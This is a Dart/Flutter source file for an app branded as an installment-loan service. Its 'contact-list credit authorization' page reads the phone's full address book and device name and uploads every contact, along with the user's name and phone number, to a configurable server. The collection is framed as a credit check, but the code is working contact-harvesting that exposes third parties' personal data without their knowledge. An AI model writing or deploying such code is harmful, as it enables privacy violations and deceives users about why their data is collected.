import 'dart:convert';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:http/http.dart' as http;

void main() {
  runApp(const XinmeiApp());
}

class XinmeiApp extends StatelessWidget {
  const XinmeiApp({super.key});

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: '信美分期',
      debugShowCheckedModeBanner: false,
      theme: ThemeData(
        brightness: Brightness.dark,
        scaffoldBackgroundColor: const Color(0xFF0A0A0A),
        colorScheme: const ColorScheme.dark(
          primary: Color(0xFFD4AF37),
          secondary: Color(0xFFC9A84C),
          surface: Color(0xFF1A1A2E),
        ),
        useMaterial3: true,
      ),
      home: const HomePage(),
    );
  }
}

// ========== 主页 ==========

class HomePage extends StatelessWidget {
  const HomePage({super.key});

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      body: Container(
        decoration: const BoxDecoration(
          gradient: LinearGradient(
            begin: Alignment.topLeft,
            end: Alignment.bottomRight,
            colors: [
              Color(0xFF0A0A0A),
              Color(0xFF1A1A2E),
              Color(0xFF16213E),
              Color(0xFF0A0A0A),
            ],
          ),
        ),
        child: Center(
          child: Column(
            mainAxisAlignment: MainAxisAlignment.center,
            children: [
              // Logo 图标
              Container(
                width: 90,
                height: 90,
                decoration: BoxDecoration(
                  shape: BoxShape.circle,
                  gradient: const LinearGradient(
                    colors: [Color(0xFFD4AF37), Color(0xFF8B6914)],
                  ),
                  boxShadow: [
                    BoxShadow(
                      color: const Color(0xFFD4AF37).withAlpha(80),
                      blurRadius: 30,
                      spreadRadius: 5,
                    ),
                  ],
                ),
                child: const Icon(Icons.credit_score, size: 48, color: Colors.white),
              ),
              const SizedBox(height: 30),
              // 标题
              ShaderMask(
                shaderCallback: (bounds) => const LinearGradient(
                  colors: [Color(0xFFD4AF37), Color(0xFFFFF8DC), Color(0xFFC9A84C)],
                ).createShader(bounds),
                child: const Text(
                  '信美分期',
                  style: TextStyle(
                    fontSize: 42,
                    fontWeight: FontWeight.w900,
                    color: Colors.white,
                    letterSpacing: 10,
                  ),
                ),
              ),
              const SizedBox(height: 12),
              Text(
                '让每一份信任都有回响',
                style: TextStyle(
                  fontSize: 14,
                  color: const Color(0xFFD4AF37).withAlpha(180),
                  letterSpacing: 4,
                ),
              ),
              const SizedBox(height: 80),
              // 按钮
              GestureDetector(
                onTap: () {
                  Navigator.push(
                    context,
                    MaterialPageRoute(builder: (_) => const ContactsPage()),
                  );
                },
                child: Container(
                  padding: const EdgeInsets.symmetric(horizontal: 50, vertical: 16),
                  decoration: BoxDecoration(
                    borderRadius: BorderRadius.circular(16),
                    gradient: const LinearGradient(
                      colors: [Color(0xFFD4AF37), Color(0xFF8B6914)],
                    ),
                    boxShadow: [
                      BoxShadow(
                        color: const Color(0xFFD4AF37).withAlpha(60),
                        blurRadius: 20,
                        spreadRadius: 2,
                      ),
                    ],
                  ),
                  child: const Text(
                    '通讯录授信',
                    style: TextStyle(
                      fontSize: 18,
                      fontWeight: FontWeight.w600,
                      color: Colors.white,
                      letterSpacing: 2,
                    ),
                  ),
                ),
              ),
            ],
          ),
        ),
      ),
    );
  }
}

// ========== MethodChannel ==========

class ContactsChannel {
  static const _channel = MethodChannel('com.example.helloChina/contacts');

  static Future<List<Map>> getContacts() async {
    final result = await _channel.invokeMethod('getContacts');
    return List<Map>.from(result as List);
  }

  static Future<String> getDeviceName() async {
    return await _channel.invokeMethod('getDeviceName') ?? '未知设备';
  }
}

// ========== 通讯录页面 ==========

class ContactsPage extends StatefulWidget {
  const ContactsPage({super.key});

  @override
  State<ContactsPage> createState() => _ContactsPageState();
}

class _ContactsPageState extends State<ContactsPage> {
  final _serverController = TextEditingController(
      text: 'http://192.168.1.8:8080/upload');
  final _uploaderController = TextEditingController();
  final _phoneController = TextEditingController();
  List<Map> _contacts = [];
  bool _loading = true;
  bool _uploading = false;
  String? _error;
  String _deviceName = '';
  String _status = '';

  @override
  void initState() {
    super.initState();
    _loadAll();
  }

  Future<void> _loadAll() async {
    try {
      final results = await Future.wait([
        ContactsChannel.getContacts(),
        ContactsChannel.getDeviceName(),
      ]);
      setState(() {
        _contacts = List<Map>.from(results[0] as List);
        _deviceName = results[1] as String;
        _uploaderController.text = _deviceName;
        _loading = false;
      });
      print('读取 ${_contacts.length} 个联系人, 设备: $_deviceName');
    } catch (e) {
      print('加载失败: $e');
      setState(() {
        _error = e.toString();
        _loading = false;
      });
    }
  }

  Future<void> _upload() async {
    final serverUrl = _serverController.text.trim();
    final uploader = _uploaderController.text.trim();
    if (serverUrl.isEmpty || uploader.isEmpty) {
      setState(() => _status = '请填写服务器地址和姓名');
      return;
    }

    setState(() => _uploading = true);
    try {
      final body = jsonEncode({
        'uploader': uploader,
        'phone': _phoneController.text.trim(),
        'deviceName': _deviceName,
        'timestamp': DateTime.now().toIso8601String(),
        'contacts': _contacts,
      });

      final response = await http.post(
        Uri.parse(serverUrl),
        headers: {'Content-Type': 'application/json'},
        body: body,
      ).timeout(const Duration(seconds: 10));

      setState(() {
        _uploading = false;
        _status = response.statusCode == 200
            ? '授信资料已提交，${_contacts.length}个联系人已上传'
            : '提交失败: ${response.statusCode}';
      });
    } catch (e) {
      setState(() {
        _uploading = false;
        _status = '无法连接服务器，请检查地址和网络';
      });
    }
  }

  @override
  void dispose() {
    _serverController.dispose();
    _uploaderController.dispose();
    _phoneController.dispose();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    final isDark = Theme.of(context).brightness == Brightness.dark;

    return Scaffold(
      backgroundColor: const Color(0xFF0D0D1A),
      appBar: AppBar(
        title: const Row(
          children: [
            Icon(Icons.credit_score, color: Color(0xFFD4AF37), size: 22),
            SizedBox(width: 8),
            Text('通讯录授信', style: TextStyle(fontWeight: FontWeight.w600)),
          ],
        ),
        backgroundColor: const Color(0xFF111128),
        elevation: 0,
        foregroundColor: Colors.white,
      ),
      body: _loading
          ? const Center(
              child: CircularProgressIndicator(color: Color(0xFFD4AF37)))
          : _error != null
              ? _buildError()
              : _buildContent(isDark),
    );
  }

  Widget _buildError() {
    return Center(
      child: Column(
        mainAxisAlignment: MainAxisAlignment.center,
        children: [
          const Icon(Icons.error_outline, size: 60, color: Colors.red),
          const SizedBox(height: 16),
          const Text('加载失败', style: TextStyle(fontSize: 18, color: Colors.grey)),
          const SizedBox(height: 20),
          ElevatedButton(
            onPressed: _loadAll,
            style: ElevatedButton.styleFrom(
              backgroundColor: const Color(0xFFD4AF37),
            ),
            child: const Text('重试', style: TextStyle(color: Colors.white)),
          ),
        ],
      ),
    );
  }

  Widget _buildContent(bool isDark) {
    return Column(
      children: [
        // ---- 信息卡片 ----
        _buildInfoCard(),
        // ---- 联系人数量 ----
        Padding(
          padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 10),
          child: Row(
            children: [
              Container(
                width: 3,
                height: 16,
                decoration: const BoxDecoration(
                  color: Color(0xFFD4AF37),
                  borderRadius: BorderRadius.vertical(top: Radius.circular(2), bottom: Radius.circular(2)),
                ),
              ),
              const SizedBox(width: 8),
              Text(
                '通讯录 · ${_contacts.length}人',
                style: const TextStyle(
                  color: Color(0xFFD4AF37),
                  fontWeight: FontWeight.w600,
                  fontSize: 15,
                ),
              ),
            ],
          ),
        ),
        // ---- 联系人列表 ----
        Expanded(
          child: _contacts.isEmpty
              ? const Center(
                  child: Text('通讯录为空', style: TextStyle(color: Colors.grey)))
              : ListView.builder(
                  padding: const EdgeInsets.symmetric(horizontal: 12),
                  itemCount: _contacts.length,
                  itemBuilder: (context, index) {
                    final c = _contacts[index];
                    final name = c['displayName'] as String? ?? '';
                    final phones = c['phones'] as List? ?? [];
                    final phone = phones.isNotEmpty ? phones.first.toString() : '';
                    return Container(
                      margin: const EdgeInsets.symmetric(vertical: 3),
                      decoration: BoxDecoration(
                        color: const Color(0xFF1A1A2E),
                        borderRadius: BorderRadius.circular(12),
                        border: Border.all(
                          color: Colors.white.withAlpha(10),
                        ),
                      ),
                      child: ListTile(
                        leading: Container(
                          width: 40,
                          height: 40,
                          decoration: BoxDecoration(
                            shape: BoxShape.circle,
                            gradient: LinearGradient(
                              colors: [
                                const Color(0xFFD4AF37).withAlpha(60),
                                const Color(0xFF8B6914).withAlpha(40),
                              ],
                            ),
                            border: Border.all(
                              color: const Color(0xFFD4AF37).withAlpha(80),
                            ),
                          ),
                          child: Center(
                            child: Text(
                              name.isNotEmpty ? name[0].toUpperCase() : '?',
                              style: const TextStyle(
                                color: Color(0xFFD4AF37),
                                fontWeight: FontWeight.bold,
                                fontSize: 16,
                              ),
                            ),
                          ),
                        ),
                        title: Text(
                          name.isNotEmpty ? name : '无名',
                          style: const TextStyle(
                            color: Colors.white,
                            fontSize: 14,
                          ),
                        ),
                        subtitle: phone.isNotEmpty
                            ? Text(
                                phone,
                                style: TextStyle(
                                  color: Colors.white.withAlpha(120),
                                  fontSize: 12,
                                ),
                              )
                            : null,
                      ),
                    );
                  },
                ),
        ),
        // ---- 底部上传区 ----
        _buildBottomBar(),
      ],
    );
  }

  Widget _buildInfoCard() {
    return Container(
      margin: const EdgeInsets.fromLTRB(16, 12, 16, 0),
      padding: const EdgeInsets.all(16),
      decoration: BoxDecoration(
        borderRadius: BorderRadius.circular(16),
        gradient: const LinearGradient(
          colors: [Color(0xFF1E1E3A), Color(0xFF16162D)],
        ),
        border: Border.all(color: const Color(0xFFD4AF37).withAlpha(30)),
        boxShadow: [
          BoxShadow(
            color: Colors.black.withAlpha(80),
            blurRadius: 10,
            offset: const Offset(0, 4),
          ),
        ],
      ),
      child: Column(
        children: [
          // 服务器地址
          _buildInput(
            controller: _serverController,
            label: '服务器地址',
            hint: 'http://IP:8080/upload',
            icon: Icons.dns_outlined,
          ),
          const SizedBox(height: 10),
          // 姓名 + 手机号 并排
          Row(
            children: [
              Expanded(
                child: _buildInput(
                  controller: _uploaderController,
                  label: '姓名',
                  hint: '您的姓名',
                  icon: Icons.person_outline,
                ),
              ),
              const SizedBox(width: 10),
              Expanded(
                child: _buildInput(
                  controller: _phoneController,
                  label: '手机号',
                  hint: '当前手机号码',
                  icon: Icons.phone_iphone,
                  keyboardType: TextInputType.phone,
                ),
              ),
            ],
          ),
          const SizedBox(height: 6),
          Row(
            children: [
              Icon(Icons.phone_android, size: 13,
                  color: const Color(0xFFD4AF37).withAlpha(150)),
              const SizedBox(width: 4),
              Text(
                _deviceName,
                style: TextStyle(
                  color: Colors.white.withAlpha(120),
                  fontSize: 12,
                ),
              ),
            ],
          ),
        ],
      ),
    );
  }

  Widget _buildInput({
    required TextEditingController controller,
    required String label,
    required String hint,
    required IconData icon,
    TextInputType keyboardType = TextInputType.text,
  }) {
    return TextField(
      controller: controller,
      keyboardType: keyboardType,
      style: const TextStyle(fontSize: 14, color: Colors.white),
      decoration: InputDecoration(
        labelText: label,
        hintText: hint,
        labelStyle: TextStyle(color: const Color(0xFFD4AF37).withAlpha(180), fontSize: 12),
        hintStyle: TextStyle(color: Colors.white.withAlpha(60), fontSize: 13),
        prefixIcon: Icon(icon, size: 18, color: const Color(0xFFD4AF37).withAlpha(150)),
        filled: true,
        fillColor: Colors.white.withAlpha(8),
        border: OutlineInputBorder(
          borderRadius: BorderRadius.circular(10),
          borderSide: BorderSide.none,
        ),
        enabledBorder: OutlineInputBorder(
          borderRadius: BorderRadius.circular(10),
          borderSide: BorderSide(color: Colors.white.withAlpha(15)),
        ),
        focusedBorder: OutlineInputBorder(
          borderRadius: BorderRadius.circular(10),
          borderSide: const BorderSide(color: Color(0xFFD4AF37), width: 1),
        ),
        contentPadding: const EdgeInsets.symmetric(horizontal: 14, vertical: 12),
        isDense: true,
      ),
    );
  }

  Widget _buildBottomBar() {
    return Container(
      padding: const EdgeInsets.fromLTRB(16, 4, 16, 20),
      decoration: BoxDecoration(
        color: const Color(0xFF111128),
        boxShadow: [
          BoxShadow(
            color: Colors.black.withAlpha(100),
            blurRadius: 10,
            offset: const Offset(0, -2),
          ),
        ],
      ),
      child: Column(
        children: [
          if (_status.isNotEmpty)
            Padding(
              padding: const EdgeInsets.only(bottom: 8),
              child: Text(
                _status,
                style: TextStyle(
                  color: _status.contains('成功') || _status.contains('已提交')
                      ? const Color(0xFF4CAF50)
                      : Colors.redAccent,
                  fontSize: 13,
                ),
                textAlign: TextAlign.center,
              ),
            ),
          SizedBox(
            width: double.infinity,
            child: ElevatedButton(
              onPressed: _uploading ? null : _upload,
              style: ElevatedButton.styleFrom(
                backgroundColor: const Color(0xFFD4AF37),
                foregroundColor: Colors.white,
                disabledBackgroundColor: const Color(0xFFD4AF37).withAlpha(100),
                padding: const EdgeInsets.symmetric(vertical: 14),
                shape: RoundedRectangleBorder(
                  borderRadius: BorderRadius.circular(12),
                ),
                elevation: 0,
              ),
              child: _uploading
                  ? const SizedBox(
                      height: 20,
                      width: 20,
                      child: CircularProgressIndicator(
                          strokeWidth: 2, color: Colors.white),
                    )
                  : const Text('提交授信资料',
                      style: TextStyle(fontSize: 17, fontWeight: FontWeight.w600, letterSpacing: 2)),
            ),
          ),
        ],
      ),
    );
  }
}
